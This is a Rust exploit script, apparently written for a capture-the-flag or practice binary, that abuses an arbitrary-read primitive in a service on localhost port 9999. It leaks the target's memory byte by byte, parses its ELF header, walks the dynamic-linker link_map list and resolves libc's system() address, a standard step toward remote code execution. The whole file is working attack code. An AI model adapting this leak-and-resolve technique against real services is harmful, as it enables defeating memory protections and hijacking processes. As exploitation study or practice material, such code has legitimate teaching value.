extern crate skua;
#[macro_use] extern crate error_chain;
extern crate goblin;


pub mod error {
    error_chain! {
        types {
            Error, ErrorKind, ResultExt, Result;
        }

        foreign_links {
            AegError(::skua::error::Error);
            FromUtf8Error(::std::string::FromUtf8Error);
            IoError(::std::io::Error);
            ParseIntError(::std::num::ParseIntError);
        }

        errors {
            LeakFail(address: u64) {
                description("Failed to leak bytes from address")
                display("Failed to leak bytes from {:x}", address)
            }
        }
    }
}

use error::*;

use skua::Stream;
use skua::leak::{ElfLeak, Leaker, Program};
use std::rc::Rc;


#[derive(Clone)]
pub struct Pwn {
    stream: Rc<skua::Stream>
}


impl Pwn {
    pub fn new(stream: Rc<Stream>) -> Pwn {
        Pwn {
            stream: stream
        }
    }

    pub fn stream(&self) -> Rc<Stream> { self.stream.clone() }
}


impl Leaker for Pwn {
    fn leak_u8(&self, address: u64) -> std::result::Result<u8, skua::error::Error> {
        // println!("leak_u8: 0x{:x}", address);
        self.stream().send(&vec![0])?;
        self.stream().send_le64(address)?;
        Ok(self.stream().recv_byte().unwrap())
    }
    fn endian(&self) -> &skua::leak::Endian { &skua::leak::Endian::Little }
}


fn run () -> Result<()> {
    let stream = Rc::new(Stream::connect("127.0.0.1:9999")?);

    let pwn = Rc::new(Pwn::new(stream));

    let mut line = String::from_utf8(pwn.stream().recv_line()?)?;

    let leak_address = u64::from_str_radix(&line.split_off(2), 16)?;

    println!("address: {:x}", leak_address);

    let elf = ElfLeak::new(leak_address, pwn.clone())?;

    println!("elf base address: 0x{:x}", elf.base_address());
    println!("elf entry: 0x{:x}", elf.ehdr()?.e_entry()?);
    println!("elf shnum: {}", elf.ehdr()?.e_shnum()?);
    println!("elf phnum: {}", elf.ehdr()?.e_phnum()?);
    println!("elf shentsize: {}", elf.ehdr()?.e_shentsize()?);
    println!("elf phentsize: {}", elf.ehdr()?.e_phentsize()?);
    println!("elf phoff: 0x{:x}", elf.ehdr()?.e_phoff()?);
    println!("elf shoff: 0x{:x}", elf.ehdr()?.e_shoff()?);


    // for shdr in elf.shdrs()? {
    //     println!("shdr base address: {:x}", shdr.base_address());
    //     println!("shdr name: {:x}", shdr.sh_name()?);
    //     println!("shdr addr: {:x}", shdr.sh_addr()?);
    // }

    let class = elf.ehdr()?.class()?.clone();

    let dt_debug = 
        elf.find_dynamic(goblin::elf::dyn::DT_DEBUG)?
            .expect("Failed to find dt_debug");

    use skua::leak::LinkMap;

    fn find_first_link_map<L: Leaker>(pwn: Rc<L>, mut link_map: LinkMap<L>)
        -> Result<LinkMap<L>> {

        while link_map.l_prev()? > 0 {

            println!("link_map.base_address() = {:x}", link_map.base_address());
            println!("link_map.l_addr() = {:x}", link_map.l_addr()?);
            println!("link_map.l_name() = {}", pwn.leak_string(link_map.l_name()?)?);
            println!("link_map.l_ld() = {:x}", link_map.l_ld()?);
            println!("link_map.l_next() = {:x}", link_map.l_next()?);
            println!("link_map.l_prev() = {:x}", link_map.l_prev()?);

            link_map =
                LinkMap::new(
                    link_map.l_prev()?,
                    link_map.class().clone(),
                    pwn.clone());
        }

        Ok(link_map)
    }

    println!("dt_debug: {:x}", dt_debug.d_val()?);

    // address to r_debug
    let address = dt_debug.d_val()?;// + base_address;

    // address to link_map
    let address = pwn.leak_u64(address + 8)?;

    println!("link_map address = {:x}", address);

    let link_map = LinkMap::new(address, class, pwn.clone());

    let mut link_map = find_first_link_map(pwn.clone(), link_map)?;

    loop {
        println!("link_map.l_addr() = {:x}", link_map.l_addr()?);
        println!("link_map.l_name() = {}", pwn.leak_string(link_map.l_name()?)?);
        if link_map.l_next()? == 0 { break; }
        link_map =
            LinkMap::new(
                link_map.l_next()?,
                link_map.class().clone(),
                pwn.clone());
    }

    let program = Program::new(leak_address, pwn.clone())?;

    let system_address =
        program.resolve("libc", "system")?
            .expect("Failed to resolve system address");

    println!("system: 0x{:x}", system_address);

    pwn.stream().send(&vec![1])?;

    Ok(())
}


fn main () {
    match run() {
        Ok(_) => {},
        Err(e) => {
            eprintln!("error: {}", e);
            for e in e.iter().skip(1) {
                eprintln!("caused by: {}", e);
            }
            if let Some(backtrace) = e.backtrace() {
                eprintln!("backtrace: {:?}", backtrace);
            }
        }
    }
}
